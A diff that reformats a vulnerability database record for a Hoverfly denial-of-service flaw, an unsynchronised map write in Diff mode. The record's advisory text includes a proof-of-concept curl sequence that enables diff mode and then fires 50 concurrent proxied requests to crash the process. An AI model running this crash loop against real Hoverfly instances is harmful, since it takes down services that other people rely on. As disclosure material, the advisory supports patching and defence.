@@ -1,10 +1,6 @@
-[id]
-ave_id = "AVE-2026-0334"
-aliases = ["CVE-2026-50013","GHSA-qrh4-p6v4-mrfg"]
-
 [basic]
-title = "Hoverfly: Process Crash via Concurrent Map Write Race Condition in Diff Mode"
-description = "### Summary:
+description = """
+### Summary:
 
 When Hoverfly is running in Diff mode, the `AddDiff()` function writes to the shared `responsesDiff` map without any synchronization (no mutex). When multiple proxy requests are processed concurrently (the normal case for any proxy), the concurrent map writes trigger Go's built-in race detector which causes a `fatal error: concurrent map read and map write`, immediately killing the entire Hoverfly process. This is trivially exploitable by sending multiple simultaneous requests.
 
@@ -38,7 +34,7 @@ The field is declared as a plain `map[v2.SimpleRequestDefinitionView][]v2.DiffRe
 - **Hoverfly version:** v1.12.7
 - **Operating System:** macOS Darwin 25.4.0
 - **Go version:** 1.26.2
-- **Configuration:** Hoverfly in Diff mode (`PUT /api/v2/hoverfly/mode {\"mode\":\"diff\"}`)
+- **Configuration:** Hoverfly in Diff mode (`PUT /api/v2/hoverfly/mode {"mode":"diff"}`)
 
 ### POC:
 
@@ -49,22 +45,18 @@ The field is declared as a plain `map[v2.SimpleRequestDefinitionView][]v2.DiffRe
 sleep 2
 
 # Set diff mode
-curl -X PUT http://localhost:8888/api/v2/hoverfly/mode \
-  -H \"Content-Type: application/json\" \
-  -d '{\"mode\": \"diff\"}'
+curl -X PUT http://localhost:8888/api/v2/hoverfly/mode -H "Content-Type: application/json" -d '{"mode": "diff"}'
 
 # Load a simulation for diff comparison
-curl -X PUT http://localhost:8888/api/v2/simulation \
-  -H \"Content-Type: application/json\" \
-  -d '{
-    \"data\": {
-      \"pairs\": [{
-        \"request\": {\"path\": [{\"matcher\": \"glob\", \"value\": \"*\"}]},
-        \"response\": {\"status\": 200, \"body\": \"expected\"}
+curl -X PUT http://localhost:8888/api/v2/simulation -H "Content-Type: application/json" -d '{
+    "data": {
+      "pairs": [{
+        "request": {"path": [{"matcher": "glob", "value": "*"}]},
+        "response": {"status": 200, "body": "expected"}
       }],
-      \"globalActions\": {\"delays\": [], \"delaysLogNormal\": []}
+      "globalActions": {"delays": [], "delaysLogNormal": []}
     },
-    \"meta\": {\"schemaVersion\": \"v5.2\"}
+    "meta": {"schemaVersion": "v5.2"}
   }'
 ```
 
@@ -73,7 +65,7 @@ curl -X PUT http://localhost:8888/api/v2/simulation \
 ```bash
 # Send 50 concurrent requests, race condition triggers within seconds
 for i in $(seq 1 50); do
-    curl -s -x http://localhost:8500 \"http://httpbin.org/get?id=$i\" &
+    curl -s -x http://localhost:8500 "http://httpbin.org/get?id=$i" &
 done
 wait
 ```
@@ -104,21 +96,29 @@ The process crashes with ~50 concurrent requests. In production with real traffi
 - **Trivial exploitation:** Any attacker with proxy access can trigger this by sending multiple concurrent requests
 - **No admin API access required:** Only proxy port access is needed to trigger the crash
 - **Unrecoverable:** `fatal error` in Go cannot be caught by `recover()` — the process is unconditionally killed
-- **Affects all Diff mode users:** Any team using Diff mode for API comparison testing is vulnerable"
-severity = "HIGH"
-score = 5
-sources = ["ghsa"]
-published = ""
-updated = ""
+- **Affects all Diff mode users:** Any team using Diff mode for API comparison testing is vulnerable"""
+published = "2026-01-01"
 remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Hoverfly: Process Crash via Concurrent Map Write Race Condition in Diff Mode"
+updated = "2026-01-01"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = [
+    "CVE-2026-50013",
+    "GHSA-qrh4-p6v4-mrfg",
+]
+ave_id = "AVE-2026-0334"
+
+[meta]
+collected_at = "2026-07-23T01:28:29.171533483+00:00"
+status = "completed"
 
 [references]
 urls = []
-
-[exploit]
-poc_urls = []
-exp_urls = []
-
-[meta]
-status = "completed"
-collected_at = "2026-07-23T01:28:29.171533483+00:00"
